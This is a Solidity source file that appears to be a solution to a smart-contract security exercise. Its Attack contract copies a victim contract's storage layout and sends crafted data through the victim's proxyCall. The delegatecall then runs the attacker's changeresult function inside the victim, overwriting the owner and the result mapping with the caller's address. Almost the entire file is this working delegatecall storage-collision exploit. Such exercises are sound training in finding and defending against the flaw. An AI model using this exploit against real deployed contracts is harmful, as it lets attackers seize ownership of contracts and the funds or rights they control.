// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import {console2} from "forge-std/Test.sol";

interface ID31eg4t3 {
    function proxyCall(bytes calldata data) external returns (address);
    function changeResult() external;
}

contract Attack {
    address internal immutable victim;
    // TODO: Declare some variable here
    uint256 var0 = 12345;
    uint8 var1 = 32;
    string private var2;
    address private var3;
    uint8 private var4;
    address public owner;
    mapping(address => bool) public result;
    // Note: Checkout the storage layout in victim contract

    constructor(address addr) payable {
        victim = addr;
    }

    // NOTE: You might need some malicious function here
    function changeresult(address new_owner) public {
        owner = new_owner;
        result[new_owner] = true;
    }

    function exploit() external {
        // TODO: Add your implementation here
        console2.log(msg.sender);
        // Note: Make sure you know how delegatecall works
         bytes memory data = abi.encodeWithSignature("changeresult(address)", msg.sender);
         ID31eg4t3(victim).proxyCall(data);
         
    }
}
